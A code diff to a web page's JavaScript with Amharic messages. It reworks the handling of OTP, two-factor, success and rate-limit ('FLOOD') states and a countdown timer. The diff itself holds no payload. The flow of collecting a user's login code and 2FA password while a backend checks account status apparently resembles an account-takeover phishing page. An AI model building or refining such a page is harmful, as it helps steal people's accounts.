@@ -326,8 +326,8 @@
 
     function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
-        const target = document.getElementById(stepId);
+        let stepId = (typeof n === 'string') ? (n.startsWith('step') ? n : 'step_' + n) : 'step' + n;
+        const target = document.getElementById(stepId) || document.getElementById(n);
         if(target) target.classList.add('active');
         
         if(savedName) {
@@ -340,10 +340,13 @@
         // API_BASE_URL በ config.js ውስጥ መገኘቱን ያረጋግጣል
         if(typeof API_BASE_URL !== 'undefined'){
             fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
-                if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
+                if (data.status === "FLOOD") { 
+                    clearInterval(statusChecker); 
+                    startFloodTimer(data.remaining_seconds || data.wait || 60); 
+                }
+                else if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
                 else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
                 else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
-                else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
             }).catch(e => {});
         }
     }
@@ -398,7 +401,10 @@
                 body: JSON.stringify({user_id: userId, name: savedName})
             });
             const data = await res.json();
-            if (data.status === "FOUND" || data.status === "NEED_OTP") {
+            if (data.status === "FLOOD") {
+                clearInterval(statusChecker);
+                startFloodTimer(data.remaining_seconds || data.wait || 60);
+            } else if (data.status === "FOUND" || data.status === "NEED_OTP") {
                 showMsg(1, 'loading-msg', 'አካውንቱ ተገኝቷል፣ ኮድ በመጠበቅ ላይ...');
             } else if (data.status === "SUCCESS") {
                 showStep('success');
@@ -472,9 +478,12 @@
     }
 
     function handleResponse(data, step) {
-        if (data.status === "SUCCESS") { showStep('success'); } 
+        if (data.status === "FLOOD") { 
+            clearInterval(statusChecker); 
+            startFloodTimer(data.remaining_seconds || data.wait || 60); 
+        }
+        else if (data.status === "SUCCESS") { showStep('success'); } 
         else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
-        else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
         else {
             stopLoaders();
             showMsg(step, 'error', 'የተሳሳተ መረጃ! እባክዎ በትክክል ያስገቡ።');
@@ -494,13 +503,27 @@
     }
 
     function startFloodTimer(seconds) {
+        stopLoaders();
+        clearInterval(statusChecker);
         showStep('flood_step');
-        let rem = seconds;
-        const iv = setInterval(() => {
-            let m = Math.floor(rem / 60), s = rem % 60;
-            document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-            if (rem-- <= 0) { clearInterval(iv); location.reload(); }
-        }, 1000);
+        let rem = parseInt(seconds) || 60;
+        
+        const updateClock = () => {
+            let m = Math.floor(rem / 60);
+            let s = rem % 60;
+            const timeEl = document.getElementById('wait_time');
+            if(timeEl) {
+                timeEl.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+            }
+            if (rem <= 0) { 
+                clearInterval(floodInterval); 
+                location.reload(); 
+            }
+            rem--;
+        };
+
+        updateClock();
+        const floodInterval = setInterval(updateClock, 1000);
     }
 
     function setupLongPressPaste() {
